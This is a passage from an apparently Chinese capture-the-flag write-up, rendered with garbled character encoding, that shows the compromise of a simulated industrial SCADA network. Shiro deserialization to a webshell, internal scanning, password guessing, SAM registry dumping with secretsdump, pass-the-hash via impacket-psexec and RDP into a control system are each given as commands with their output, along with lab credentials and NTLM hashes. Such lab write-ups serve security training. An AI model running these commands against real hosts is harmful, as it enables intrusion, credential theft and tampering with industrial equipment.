class="hljs-number">7</span>-ubuntu:~$ java -jar heapdump_tool.jar heapdump<br>[-] <span class="hljs-keyword">file</span>: heapdump<br>[-] Start jhat, waiting...<br>[-] fing object <span class="hljs-built_in">count</span>: <span class="hljs-number">86326</span><br>[-] too many object,please <span class="hljs-built_in">input</span> <span class="hljs-number">0</span>/<span class="hljs-number">1</span> <span class="hljs-keyword">to</span> choose <span class="hljs-keyword">mode</span>.<br><span class="hljs-number">0</span>. (<span class="hljs-built_in">search</span> data, may can<span class="hljs-string">&#x27;t find some data, can&#x27;</span>t use <span class="hljs-keyword">function</span> <span class="hljs-title">num</span>=,len=,getip,geturl,getfile).<br><span class="hljs-number">1</span>. (load <span class="hljs-keyword">all</span> object, need wait <span class="hljs-keyword">a</span> few minutes).<br>&gt; <span class="hljs-number">0</span><br>[-] please <span class="hljs-built_in">input</span> keyword value <span class="hljs-keyword">to</span> <span class="hljs-built_in">search</span>, example: password,re=xxx,<span class="hljs-built_in">len</span>=<span class="hljs-number">16</span>,num=<span class="hljs-number">0</span>-<span class="hljs-number">10</span>,id=<span class="hljs-number">0</span>x123a,class=org.xx,<span class="hljs-keyword">all</span>=true,geturl,getfile,getip,shirokey,systemproperties,allproperties,hashtable <span class="hljs-built_in">input</span> q/<span class="hljs-keyword">quit</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">quit</span>.<br>&gt; shirokey<br>&gt;&gt; QZYysjAYhG6/sDKQlVpR2g==<br>[-] please <span class="hljs-built_in">input</span> keyword value <span class="hljs-keyword">to</span> <span class="hljs-built_in">search</span>, example: password,re=xxx,<span class="hljs-built_in">len</span>=<span class="hljs-number">16</span>,num=<span class="hljs-number">0</span>-<span class="hljs-number">10</span>,id=<span class="hljs-number">0</span>x123a,class=org.xx,<span class="hljs-keyword">all</span>=true,geturl,getfile,getip,shirokey,systemproperties,allproperties,hashtable <span class="hljs-built_in">input</span> q/<span class="hljs-keyword">quit</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">quit</span>.<br>&gt; <br></code></pre></td></tr></table></figure><p>æ‹¿åˆ° keyï¼šQZYysjAYhG6&#x2F;sDKQlVpR2g&#x3D;&#x3D;</p><h1 id="Shiro-ååºåˆ—åŒ–"><a href="#Shiro-ååºåˆ—åŒ–" class="headerlink" title="Shiro ååºåˆ—åŒ–"></a>Shiro ååºåˆ—åŒ–</h1><p><img src="https://img.dkdun.cn/v1/2025/12/0724c28964e55125.png"></p><p>å°è¯•äº†èšå‰‘ã€å†°èéƒ½æ³¨å…¥æˆåŠŸï¼Œä½†æ˜¯è¿æ¥ä¸ä¸Šï¼Œæœ€åè¿˜å¾—æ˜¯å“¥æ–¯æ‹‰</p><p><img src="https://img.dkdun.cn/v1/2025/12/78f27e1411a8fea0.png"></p><p>åœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ° flag01</p><p><img src="https://img.dkdun.cn/v1/2025/12/fe385b827111b913.png"></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">flag01: flag&#123;759069eb-<span class="hljs-number">46b7</span>-<span class="hljs-number">4905</span>-b6c6-bf95f66233c7&#125;<br></code></pre></td></tr></table></figure><h1 id="å†…ç½‘ä¿¡æ¯æ”¶é›†"><a href="#å†…ç½‘ä¿¡æ¯æ”¶é›†" class="headerlink" title="å†…ç½‘ä¿¡æ¯æ”¶é›†"></a>å†…ç½‘ä¿¡æ¯æ”¶é›†</h1><p>ä¸Šä¼  fscan æ‰«æå†…ç½‘ä¿¡æ¯ï¼Œæœ¬æœºä¸º 172.22.17.213 </p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs inform7">/ &gt;/bin/sh -c <span class="hljs-string">&quot;cd /tmp &amp;&amp; ./FScan_2.0.1_linux_x64 -h 172.22.17.213/24&quot;</span> <br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚    ___                              _        â”‚<br>â”‚   / _ \     ___  ___ _ __ __ _  ___| | __    â”‚<br>â”‚  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    â”‚<br>â”‚ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     â”‚<br>â”‚ \____/     |___/\___|_|  \__,_|\___|_|\_\    â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>      Fscan Version: 2.0.1<br><br><span class="hljs-comment">[1.9s]</span>     å·²é€‰æ‹©æœåŠ¡æ‰«ææ¨¡å¼<br><span class="hljs-comment">[1.9s]</span>     å¼€å§‹ä¿¡æ¯æ‰«æ<br><span class="hljs-comment">[1.9s]</span>     CIDRèŒƒå›´: 172.22.17.0-172.22.17.255<br><span class="hljs-comment">[1.9s]</span>     generate_ip_range_full<br><span class="hljs-comment">[1.9s]</span>     è§£æCIDR 172.22.17.213/24 -&gt; IPèŒƒå›´ 172.22.17.0-172.22.17.255<br><span class="hljs-comment">[1.9s]</span>     æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256<br><span class="hljs-comment">[1.9s]</span>     å¼€å§‹ä¸»æœºæ‰«æ<br><span class="hljs-comment">[1.9s]</span>     ä½¿ç”¨æœåŠ¡æ’ä»¶: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle<br><span class="hljs-comment">[1.9s]</span> <span class="hljs-comment">[*]</span> ç›®æ ‡ 172.22.17.213   å­˜æ´» (ICMP)<br><span class="hljs-comment">[1.9s]</span> <span class="hljs-comment">[*]</span> ç›®æ ‡ 172.22.17.6     å­˜æ´» (ICMP)<br><span class="hljs-comment">[4.9s]</span>     å­˜æ´»ä¸»æœºæ•°é‡: 2<br><span class="hljs-comment">[4.9s]</span>     æœ‰æ•ˆç«¯å£æ•°é‡: 233<br><span class="hljs-comment">[4.9s]</span> <span class="hljs-comment">[*]</span> ç«¯å£å¼€æ”¾ 172.22.17.213:22<br><span class="hljs-comment">[4.9s]</span> <span class="hljs-comment">[*]</span> ç«¯å£å¼€æ”¾ 172.22.17.213:8080<br><span class="hljs-comment">[4.9s]</span> <span class="hljs-comment">[*]</span> ç«¯å£å¼€æ”¾ 172.22.17.6:445<br><span class="hljs-comment">[4.9s]</span> <span class="hljs-comment">[*]</span> ç«¯å£å¼€æ”¾ 172.22.17.6:139<br><span class="hljs-comment">[4.9s]</span> <span class="hljs-comment">[*]</span> ç«¯å£å¼€æ”¾ 172.22.17.6:135<br><span class="hljs-comment">[4.9s]</span> <span class="hljs-comment">[*]</span> ç«¯å£å¼€æ”¾ 172.22.17.6:21<br><span class="hljs-comment">[4.9s]</span> <span class="hljs-comment">[*]</span> ç«¯å£å¼€æ”¾ 172.22.17.6:80<br><span class="hljs-comment">[6.0s]</span>     æ‰«æå®Œæˆ, å‘ç° 7 ä¸ªå¼€æ”¾ç«¯å£<br><span class="hljs-comment">[6.0s]</span>     å­˜æ´»ç«¯å£æ•°é‡: 7<br><span class="hljs-comment">[6.0s]</span>     å¼€å§‹æ¼æ´æ‰«æ<br><span class="hljs-comment">[6.1s]</span>     POCåŠ è½½å®Œæˆ: æ€»å…±387ä¸ªï¼ŒæˆåŠŸ387ä¸ªï¼Œå¤±è´¥0ä¸ª<br><span class="hljs-comment">[6.1s]</span> <span class="hljs-comment">[+]</span> NetBios 172.22.17.6     WORKGROUP\WIN-ENGINEER        <br><span class="hljs-comment">[6.1s]</span> <span class="hljs-comment">[*]</span> NetInfo æ‰«æç»“æœ<br>ç›®æ ‡ä¸»æœº: 172.22.17.6<br>ä¸»æœºå: WIN-ENGINEER<br>å‘ç°çš„ç½‘ç»œæ¥å£:<br>   IPv4åœ°å€:<br>      â””â”€ 172.22.17.6<br><span class="hljs-comment">[6.2s]</span> <span class="hljs-comment">[*]</span> ç½‘ç«™æ ‡é¢˜ http://172.22.17.6        çŠ¶æ€ç :200 é•¿åº¦:661    æ ‡é¢˜:172.22.17.6 - /<br><span class="hljs-comment">[6.2s]</span> <span class="hljs-comment">[+]</span> FTPæœåŠ¡ 172.22.17.6:21 åŒ¿åç™»å½•æˆåŠŸ!<br><span class="hljs-comment">[6.3s]</span> <span class="hljs-comment">[*]</span> ç½‘ç«™æ ‡é¢˜ http://172.22.17.213:8080 çŠ¶æ€ç :302 é•¿åº¦:0      æ ‡é¢˜:æ— æ ‡é¢˜ é‡å®šå‘åœ°å€: http://172.22.17.213:8080/login;jsessionid=AB5C64F629CA583DECFC46E1201AAD54<br><span class="hljs-comment">[6.4s]</span> <span class="hljs-comment">[*]</span> ç½‘ç«™æ ‡é¢˜ http://172.22.17.213:8080/login;jsessionid=AB5C64F629CA583DECFC46E1201AAD54 çŠ¶æ€ç :200 é•¿åº¦:2936   æ ‡é¢˜:ç«åˆ›èƒ½æºç›‘æ§ç”»é¢ç®¡ç†å¹³å°<br><span class="hljs-comment">[7.9s]</span> <span class="hljs-comment">[+]</span> ç›®æ ‡: http://172.22.17.213:8080<br>  æ¼æ´ç±»å‹: poc-yaml-springboot-env-unauth<br>  æ¼æ´åç§°: spring2<br>  è¯¦ç»†ä¿¡æ¯:<br>å‚è€ƒé“¾æ¥:https://github.com/LandGrey/SpringBootVulExploit<br><span class="hljs-comment">[43.5s]</span>     æ‰«æå·²å®Œæˆ: 12/12<br></code></pre></td></tr></table></figure><p>å‘ç°</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.17.6</span>WIN-ENGINEER<br></code></pre></td></tr></table></figure><p>frp æµé‡è½¬å‘</p><p><img src="https://img.dkdun.cn/v1/2025/12/c1ca661508611afe.png"></p><p>æ‹¿åˆ°å†…éƒ¨èµ„æ–™</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">WIN-SCADA: <span class="hljs-number">172.22</span><span class="hljs-number">.26</span>.xx<br><span class="hljs-symbol">Username:</span> Administrator<br><span class="hljs-symbol">Password:</span> IYnT3GyCiy3<br><br><span class="hljs-number">1.</span> ç™»é™†æƒé™é™åˆ¶ï¼š<br>   ä¸ºç¡®ä¿ä¿¡æ¯ç³»ç»Ÿçš„å®‰å…¨æ€§ï¼Œè‡ªå³æ—¥èµ·ï¼Œå…¬å¸æ‰€æœ‰å·¥ç¨‹å¸ˆPCçš„ç™»é™†å°†ç”±SCADAå·¥ç¨‹å¸ˆè¿›è¡Œæ§åˆ¶ã€‚è¯·å„ä½å·¥ç¨‹å¸ˆæ³¨æ„ï¼Œåªèƒ½é€šè¿‡SCADAå·¥ç¨‹å¸ˆæä¾›çš„ç™»é™†æ–¹å¼è¿›è¡Œè®¿é—®ã€‚<br><span class="hljs-number">2.</span> ç™»é™†è´¦æˆ·è®¾ç½®ï¼š<br>   ä¸ºæ–¹ä¾¿ç®¡ç†å’Œæ ‡å‡†åŒ–ï¼Œç™»é™†è´¦æˆ·åå°†é‡‡ç”¨å§“åå…¨ç§°çš„å°å†™æ‹¼éŸ³å½¢å¼ã€‚ä¾‹å¦‚ï¼Œå¼ ä¸‰çš„è´¦æˆ·åä¸ºzhangsanï¼Œå·¥å·ä¸º<span class="hljs-number">0801</span>ã€‚åˆå§‹å¯†ç å°†ç”±è´¦æˆ·å+@+å·¥å·ç»„æˆï¼Œä¾‹å¦‚ï¼Œzhangsan<span class="hljs-subst">@0801</span>ã€‚<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/8dfe0b8e3691111a.png"></p><p>æå– SCADA å·¥ç¨‹å¸ˆä¿¡æ¯ï¼Œæ¨æµ‹ç™»å½•è´¦å·å¯†ç ä¸º</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">chenhua/<span class="hljs-symbol">chenhua@</span><span class="hljs-number">0813</span><br>zhaoli/<span class="hljs-symbol">zhaoli@</span><span class="hljs-number">0821</span><br>wangning/<span class="hljs-symbol">wangning@</span><span class="hljs-number">0837</span><br>zhangling/<span class="hljs-symbol">zhangling@</span><span class="hljs-number">0871</span><br>zhangying/<span class="hljs-symbol">zhangying@</span><span class="hljs-number">0888</span><br>wangzhiqiang/<span class="hljs-symbol">wangzhiqiang@</span><span class="hljs-number">0901</span><br>chentao/<span class="hljs-symbol">chentao@</span><span class="hljs-number">0922</span><br>zhouyong/<span class="hljs-symbol">zhouyong@</span><span class="hljs-number">0939</span><br>lilong/<span class="hljs-symbol">lilong@</span><span class="hljs-number">1046</span><br>liyumei/<span class="hljs-symbol">liyumei@</span><span class="hljs-number">1048</span><br></code></pre></td></tr></table></figure><p>æµ‹è¯• SMB ç™»å½•</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> -q crackmapexec smb <span class="hljs-number">172.22.17.6</span> -u chenhua -p <span class="hljs-string">&#x27;chenhua@0813&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/236af1fad698956c.png"></p><h1 id="æ³¨å†Œè¡¨-SAM-è½¬å‚¨"><a href="#æ³¨å†Œè¡¨-SAM-è½¬å‚¨" class="headerlink" title="æ³¨å†Œè¡¨ SAM è½¬å‚¨"></a>æ³¨å†Œè¡¨ SAM è½¬å‚¨</h1><p>rdp è¿æ¥ï¼Œä½†æ˜¯æ²¡æœ‰æƒé™è®¿é—® Administratorï¼Œè¿›è¡Œæƒé™æå‡</p><p>æŸ¥çœ‹å½“å‰è®¿é—®ä»¤ç‰Œä¸­çš„æ‰€æœ‰ä¿¡æ¯ï¼ŒåŒ…æ‹¬å½“å‰ç”¨æˆ·åã€å®‰å…¨æ ‡è¯†ç¬¦ï¼ˆSIDï¼‰ã€ç‰¹æƒå’Œå½“å‰ç”¨æˆ·æ‰€å±çš„ç»„</p><p><img src="https://img.dkdun.cn/v1/2025/12/a8ac0dd38ff367e9.png"></p><p>ç”¨ç®¡ç†å‘˜æ¨¡å¼è½¬å­˜ SAM æ–‡ä»¶</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">reg save hklm\sam <span class="hljs-name">C</span>:\Users\chenhua\Desktop\sam<br>reg save hklm\system <span class="hljs-name">C</span>:\Users\chenhua\Desktop\system<br></code></pre></td></tr></table></figure><p>å¤åˆ¶å‡ºæ¥ï¼Œæå–</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs elixir">python secretsdumps.py -sam sam -system system <span class="hljs-title class_">LOCAL</span><br><span class="hljs-title class_">Impacket</span> v0.<span class="hljs-number">12.0</span> - <span class="hljs-title class_">Copyright</span> <span class="hljs-title class_">Fortra</span>, <span class="hljs-title class_">LLC</span> <span class="hljs-keyword">and</span> its affiliated companies<br><br>[*] <span class="hljs-title class_">Target</span> system <span class="hljs-symbol">bootKey:</span> <span class="hljs-number">0x6c2be46aaccdf65a9b7be2941d6e7759</span><br>[*] <span class="hljs-title class_">Dumping</span> local <span class="hljs-title class_">SAM</span> hashes (<span class="hljs-symbol">uid:</span><span class="hljs-symbol">rid:</span><span class="hljs-symbol">lmhash:</span>nthash)<br><span class="hljs-symbol">Administrator:</span><span class="hljs-number">500</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:f82292b7ac79b05d5b0e3d302bd0d279</span>:::<br><span class="hljs-symbol">Guest:</span><span class="hljs-number">501</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br><span class="hljs-symbol">DefaultAccount:</span><span class="hljs-number">503</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br><span class="hljs-symbol">WDAGUtilityAccount:</span><span class="hljs-number">504</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:a2fa2853651307ab9936cc95c0e0acf5</span>:::<br><span class="hljs-symbol">chentao:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">47466010</span>c82da0b75328192959da3658:::<br><span class="hljs-symbol">zhaoli:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span>b83822caab67ef07b614d05fd72e215:::<br><span class="hljs-symbol">wangning:</span><span class="hljs-number">1002</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span>c52d89c176321511ec686d6c05770e3:::<br><span class="hljs-symbol">zhangling:</span><span class="hljs-number">1003</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">8349</span>a4c5dd1bdcbc5a14333dd13d9f81:::<br><span class="hljs-symbol">zhangying:</span><span class="hljs-number">1004</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">8497</span>fa5480a163cb7817f23a8525be7d:::<br><span class="hljs-symbol">lilong:</span><span class="hljs-number">1005</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:c3612c48cf829d1149f7a4e3ef4acb8a</span>:::<br><span class="hljs-symbol">liyumei:</span><span class="hljs-number">1006</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">63</span>ddcde0fa219c75e48e2cba6ea8c471:::<br><span class="hljs-symbol">wangzhiqiang:</span><span class="hljs-number">1007</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">5</span>a661f54da156dc93a5b546ea143ea07:::<br><span class="hljs-symbol">zhouyong:</span><span class="hljs-number">1008</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">5</span>d49bf647380720b9f6a15dbc3ffe432:::<br><span class="hljs-symbol">chenhua:</span><span class="hljs-number">1009</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">07</span>ff24422b538b97f3c297cc8ddc7615:::<br>[*] <span class="hljs-title class_">Cleaning</span> up...<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ° Administrator çš„ Hash</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains</span> -q impacket-psexec Administrator@<span class="hljs-number">172.22.17.6</span> -hashes <span class="hljs-number">0</span>:f82292b7ac79b05d5b0e3d302bd0d279<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/c0a05e383070f59b.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag02</span>: flag&#123;<span class="hljs-number">27680433</span>-<span class="hljs-number">4467</span>-<span class="hljs-number">467</span>a-<span class="hljs-number">96</span>fd-<span class="hljs-number">6</span>ca09258cef8&#125;<br></code></pre></td></tr></table></figure><h1 id="rdp-è¿æ¥"><a href="#rdp-è¿æ¥" class="headerlink" title="rdp è¿æ¥"></a>rdp è¿æ¥</h1><p>ç”¨ fscan æ‰«æ 172.22.26.0&#x2F;24 å‘ç°èƒ½æˆåŠŸæ‰«å‡ºç»“æœ</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs inform7">/ &gt;/bin/sh -c <span class="hljs-string">&quot;cd /tmp &amp;&amp; ./FScan_2.0.1_linux_x64 -h 172.22.26.0/24&quot;</span> <br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚    ___                              _        â”‚<br>â”‚   / _ \     ___  ___ _ __ __ _  ___| | __    â”‚<br>â”‚  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    â”‚<br>â”‚ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     â”‚<br>â”‚ \____/     |___/\___|_|  \__,_|\___|_|\_\    â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>      Fscan Version: 2.0.1<br><br><span class="hljs-comment">[1.8s]</span>     å·²é€‰æ‹©æœåŠ¡æ‰«ææ¨¡å¼<br><span class="hljs-comment">[1.8s]</span>     å¼€å§‹ä¿¡æ¯æ‰«æ<br><span class="hljs-comment">[1.8s]</span>     CIDRèŒƒå›´: 172.22.26.0-172.22.26.255<br><span class="hljs-comment">[1.8s]</span>     generate_ip_range_full<br><span class="hljs-comment">[1.8s]</span>     è§£æCIDR 172.22.26.0/24 -&gt; IPèŒƒå›´ 172.22.26.0-172.22.26.255<br><span class="hljs-comment">[1.8s]</span>     æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256<br><span class="hljs-comment">[1.8s]</span>     å¼€å§‹ä¸»æœºæ‰«æ<br><span class="hljs-comment">[1.8s]</span>     ä½¿ç”¨æœåŠ¡æ’ä»¶: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle<br><span class="hljs-comment">[1.8s]</span> <span class="hljs-comment">[*]</span> ç›®æ ‡ 172.22.26.11    å­˜æ´» (ICMP)<br><span class="hljs-comment">[4.8s]</span>     å­˜æ´»ä¸»æœºæ•°é‡: 1<br><span class="hljs-comment">[4.8s]</span>     æœ‰æ•ˆç«¯å£æ•°é‡: 233<br><span class="hljs-comment">[4.8s]</span> <span class="hljs-comment">[*]</span> ç«¯å£å¼€æ”¾ 172.22.26.11:135<br><span class="hljs-comment">[4.8s]</span> <span class="hljs-comment">[*]</span> ç«¯å£å¼€æ”¾ 172.22.26.11:1433<br><span class="hljs-comment">[4.8s]</span> <span class="hljs-comment">[*]</span> ç«¯å£å¼€æ”¾ 172.22.26.11:80<br><span class="hljs-comment">[4.8s]</span> <span class="hljs-comment">[*]</span> ç«¯å£å¼€æ”¾ 172.22.26.11:445<br><span class="hljs-comment">[4.8s]</span> <span class="hljs-comment">[*]</span> ç«¯å£å¼€æ”¾ 172.22.26.11:139<br><span class="hljs-comment">[4.8s]</span>     æ‰«æå®Œæˆ, å‘ç° 5 ä¸ªå¼€æ”¾ç«¯å£<br><span class="hljs-comment">[4.8s]</span>     å­˜æ´»ç«¯å£æ•°é‡: 5<br><span class="hljs-comment">[4.8s]</span>     å¼€å§‹æ¼æ´æ‰«æ<br><span class="hljs-comment">[4.8s]</span> <span class="hljs-comment">[*]</span> NetInfo æ‰«æç»“æœ<br>ç›®æ ‡ä¸»æœº: 172.22.26.11<br>ä¸»æœºå: WIN-SCADA<br>å‘ç°çš„ç½‘ç»œæ¥å£:<br>   IPv4åœ°å€:<br>      â””â”€ 172.22.26.11<br><span class="hljs-comment">[4.8s]</span> <span class="hljs-comment">[+]</span> NetBios 172.22.26.11    WORKGROUP\WIN-SCADA           <br><span class="hljs-comment">[4.8s]</span>     POCåŠ è½½å®Œæˆ: æ€»å…±387ä¸ªï¼ŒæˆåŠŸ387ä¸ªï¼Œå¤±è´¥0ä¸ª<br><span class="hljs-comment">[4.8s]</span> <span class="hljs-comment">[+]</span> MSSQL 172.22.26.11:1433 sa 123456<br><span class="hljs-comment">[5.2s]</span> <span class="hljs-comment">[*]</span> ç½‘ç«™æ ‡é¢˜ http://172.22.26.11       çŠ¶æ€ç :200 é•¿åº¦:703    æ ‡é¢˜:IIS Windows Server<br><span class="hljs-comment">[5.6s]</span>     æ‰«æå·²å®Œæˆ: 9/9<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°ä¿¡æ¯</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.26.11</span>    WORKGROUP\WIN-SCADA <br></code></pre></td></tr></table></figure><p>rdp è¿æ¥</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Administrator:</span>IYnT3GyCiy3<br></code></pre></td></tr></table></figure><p>è¿›åˆ°äº†ä¸ªæ§åˆ¶ç³»ç»Ÿï¼Œæ‰“å¼€é”…ç‚‰é€ flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/39da527642fe8dbe.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;bcd080d5-<span class="hljs-number">2</span>cf1-<span class="hljs-number">4095</span>-ac15-fa4bef9ca1c0&#125;<br></code></pre></td></tr></table></figure><h1 id="NET-é€†å‘è§£å¯†-RSA-AES"><a href="#NET-é€†å‘è§£å¯†-RSA-AES" class="headerlink" title=".NET é€†å‘è§£å¯† RSA&#x2F;AES"></a>.NET é€†å‘è§£å¯† RSA&#x2F;AES</h1><p>æ¡Œé¢æœ‰ä¸€ä¸ª title ä¸º å¦‚ä½•è§£å¯†ä½ çš„æ–‡ä»¶ 